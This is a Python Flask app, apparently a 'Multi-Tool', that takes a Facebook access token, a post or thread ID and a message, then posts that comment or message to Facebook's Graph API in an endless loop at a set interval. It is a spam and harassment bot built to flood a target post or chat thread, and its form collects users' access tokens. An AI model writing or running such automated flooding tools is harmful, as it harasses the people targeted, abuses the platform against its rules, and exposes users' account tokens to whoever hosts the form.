from flask import Flask, request, render_template_string
import requests
import time

app = Flask(__name__)

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-Tool by Raghu ACC Rullx Boy</title>
    <style>
        body { background-color: #f2f2f2; font-family: Arial, sans-serif; }
        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; }
        h1 { text-align: center; color: #333; }
        label { font-weight: bold; }
        .btn { background-color: #4CAF50; color: white; padding: 10px; border: none; cursor: pointer; width: 100%; }
        .btn:hover { background-color: #45a049; }
        footer { text-align: center; margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Multi-Tool by Raghu ACC Rullx Boy</h1>
        <form method="POST">
            <label>Access Token:</label>
            <input type="text" name="access_token" required><br><br>
            
            <label>Post ID (for Comments) / Thread ID (for Messages):</label>
            <input type="text" name="id" required><br><br>
            
            <label>Message or Comment Text:</label>
            <textarea name="message" rows="4" required></textarea><br><br>
            
            <label>Choose Action:</label><br>
            <input type="radio" name="action" value="comment" required> Auto Comment<br>
            <input type="radio" name="action" value="message" required> Auto Message<br><br>
            
            <label>Time Interval (seconds):</label>
            <input type="number" name="interval" value="5" required><br><br>
            
            <button type="submit" class="btn">Start</button>
        </form>
    </div>
    <footer>
        <p>Created by Raghu ACC Rullx Boy ❤️</p>
    </footer>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        access_token = request.form['access_token']
        target_id = request.form['id']
        message = request.form['message']
        action = request.form['action']
        interval = int(request.form['interval'])

        if action == 'comment':
            api_url = f"https://graph.facebook.com/v15.0/{target_id}/comments"
        else:
            api_url = f"https://graph.facebook.com/v15.0/t_{target_id}/messages"

        headers = {
            'Authorization': f'Bearer {access_token}'
        }

        while True:
            try:
                payload = {'message': message}
                response = requests.post(api_url, headers=headers, data=payload)
                if response.status_code == 200:
                    print(f"✅ {action.capitalize()} sent successfully: {message}")
                else:
                    print(f"❌ Failed to send {action}: {response.text}")
                time.sleep(interval)
            except Exception as e:
                print(f"⚠️ Error: {e}")
                time.sleep(30)
    
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
